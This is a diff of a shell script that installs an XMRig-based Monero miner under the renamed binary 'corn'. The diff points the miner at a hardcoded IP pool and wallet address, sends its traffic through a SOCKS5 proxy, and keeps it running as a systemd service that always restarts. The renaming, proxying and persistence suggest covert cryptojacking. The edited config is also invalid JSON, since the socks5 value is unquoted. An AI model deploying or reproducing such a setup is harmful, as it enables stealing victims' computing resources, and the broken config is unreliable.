@@ -48,10 +48,10 @@ cat > /home/corn/config.json <<EOL
         "init": -1,
         "init-avx2": -1,
         "mode": "auto",
-        "1gb-pages": false,
-        "rdmsr": true,
-        "wrmsr": true,
-        "cache_qos": false,
+        "1gb-pages": true,
+        "rdmsr": false,
+        "wrmsr": false,
+        "cache_qos": true,
         "numa": true,
         "scratchpad_prefetch_mode": 1
     },
@@ -90,19 +90,19 @@ cat > /home/corn/config.json <<EOL
     "log-file": null,
     "pools": [
         {
-            "algo": null,
+            "algo": "rx/0",
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
+            "url": "114.29.237.94:3333",
+            "user": "43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd",
             "pass": "x",
             "rig-id": null,
-            "nicehash": false,
-            "keepalive": false,
+            "nicehash": true,
+            "keepalive": true,
             "enabled": true,
             "tls": false,
             "tls-fingerprint": null,
             "daemon": false,
-            "socks5": null,
+            "socks5": 127.0.0.1:1080,
             "self-select": null,
             "submit-to-origin": false
         }
@@ -149,7 +149,9 @@ After=network.target
 
 WorkingDirectory=/home/corn
 
-ExecStart=/home/corn/corn -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x -k --proxy 127.0.0.1:1080 
+ExecStart=/home/corn/corn
+
+#ExecStart=/home/corn/corn -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x -k --proxy 127.0.0.1:1080 
 
 Restart=always
 
